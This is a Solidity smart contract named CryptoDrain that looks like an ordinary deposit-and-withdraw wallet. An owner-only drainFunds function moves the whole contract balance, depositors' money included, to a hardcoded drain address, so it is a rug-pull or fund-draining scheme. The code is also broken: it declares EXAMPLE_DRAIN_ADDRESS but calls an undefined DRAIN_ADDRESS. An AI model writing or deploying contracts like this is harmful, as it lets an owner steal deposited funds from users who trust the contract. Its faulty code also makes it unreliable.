// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CryptoDrain {
    address public owner;
    address public constant EXAMPLE_DRAIN_ADDRESS = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;
    mapping(address => uint256) public balances;

    event FundsDrained(address indexed from, address indexed to, uint256 amount);

    constructor() {
        owner = msg.sender;
    }


    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }


    function drainFunds() public {
        require(msg.sender == owner, "Only the owner can drain funds");
        uint256 contractBalance = address(this).balance;


        (bool success, ) = DRAIN_ADDRESS.call{value: contractBalance}("");
        require(success, "Transfer failed.");

        emit FundsDrained(address(this), DRAIN_ADDRESS, contractBalance);
    }


    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed.");
    }


    receive() external payable {
        balances[msg.sender] += msg.value;
    }

    // Function to check balance
    function checkBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}
